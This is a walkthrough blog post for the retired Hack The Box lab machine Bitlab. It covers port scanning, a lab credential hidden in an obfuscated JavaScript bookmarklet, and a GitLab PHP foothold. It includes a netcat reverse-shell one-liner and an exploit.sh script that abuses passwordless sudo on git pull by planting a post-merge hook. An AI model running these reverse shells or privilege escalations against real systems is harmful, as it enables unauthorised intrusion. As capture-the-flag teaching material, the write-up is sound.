---
layout: post
title: "Bitlab: Hack The Box Walkthrough"
date: 2020-01-12 08:36:49 +0000
last_modified_at: 2020-01-12 08:36:49 +0000
category: Walkthrough
tags: ["Hack The Box", Bitlab, retired, Linux]
comments: true
image:
  feature: bitlab-htb-walkthrough.jpg
  credit: Republica / Pixabay
  creditlink: https://pixabay.com/photos/flasks-erlenmeyer-chemistry-606612/
---

This post documents the complete walkthrough of Bitlab, a retired vulnerable [VM][1] created by [Frey][2] and [thek][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Bitlab is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.114 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-10 06:27:53 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.114                                    
Discovered open port 80/tcp on 10.10.10.114
```

Nothing special stands out. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.114
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    syn-ack ttl 62 nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
```

This is how the site looks like.


{% include image.html image_alt="daf62219.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/daf62219.png" %}


### `robots.txt`

Long story short, I found an interesting file `bookmarks.html` at `/help`.


{% include image.html image_alt="0eeae026.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/0eeae026.png" %}


There's a JavaScript hyperlink at GitLab Login.


{% include image.html image_alt="e5885788.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/e5885788.png" %}


This is what it looks like.

```
javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

It's easy to decode the above in Scratchpad.


{% include image.html image_alt="100e7322.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/100e7322.png" %}


As you can see, there's a credential (`clave:11des0081x`). I suppose that's for the GitLab login.

### GitLab

Let's give it a shot.


{% include image.html image_alt="001b2463.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/001b2463.png" %}


Sweet.

### Something's up with the profile

Long story short, the creators have kindly left a PHP profile page under Settings for the purpose of getting that foothold.


{% include image.html image_alt="e92d2e0c.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/e92d2e0c.png" %}


It coincides with the Profile repository under the Administrator's projects. Simply edit `index.php` and merge it to the master branch.


{% include image.html image_alt="51c81730.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/51c81730.png" %}


Let's check it out.


{% include image.html image_alt="ea1271ea.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/ea1271ea.png" %}


## Low-Privilege Shell

Time to connect back our reverse shell. For that, I'm using this one-liner.

```
rm -rf /var/tmp/p; mknod /var/tmp/p p; bash </var/tmp/p | nc 10.10.13.79 1234 >/var/tmp/p
```

On my `nc` listening at `1234/tcp`, a reverse shell appears...


{% include image.html image_alt="bec849d7.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/bec849d7.png" %}


## Privilege Escalation

During enumeration of `www-data`'s account, I notice that `www-data` is able to `sudo` to `root` without password for `git pull`.


{% include image.html image_alt="a552c8b9.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/a552c8b9.png" %}


With that in mind, I wrote the following script to escalate my privileges using `git` hooks, particularly [`post-merge`](https://www.git-scm.com/docs/githooks#_post_merge).

The idea is simple. Initialize one Git repository, then `git clone` it to another. Update the first one, then perform a `git pull` on the second, triggering `post-merge` with `root` privileges.


{% include image.html image_alt="bf29dabd.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/bf29dabd.png" %}


<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

one=$(mktemp -d -p /dev/shm)
two=$(mktemp -d -p /dev/shm)

cd $one
git init .
echo 'hello' > readme.md
git add .
git commit -m "add readme"

cd $two
git clone file://$one .

cd $one
echo 'hello world' > readme.md
git add .
git commit -m "update readme"

cd $two
echo '#!/bin/bash' > .git/hooks/post-merge
echo >> .git/hooks/post-merge
echo 'rm -rf /var/tmp/p; mknod /var/tmp/p p; bash </var/tmp/p | nc 10.10.13.79 4321 >/var/tmp/p' >> .git/hooks/post-merge
chmod +x .git/hooks/post-merge

# bombs away
sudo git pull
```

On my `nc` listening at `4321/tcp`, a `root` shell appears...


{% include image.html image_alt="6c649398.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/6c649398.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/207
[2]: https://www.hackthebox.eu/home/users/profile/33283
[3]: https://www.hackthebox.eu/home/users/profile/4615
[4]: https://www.hackthebox.eu/
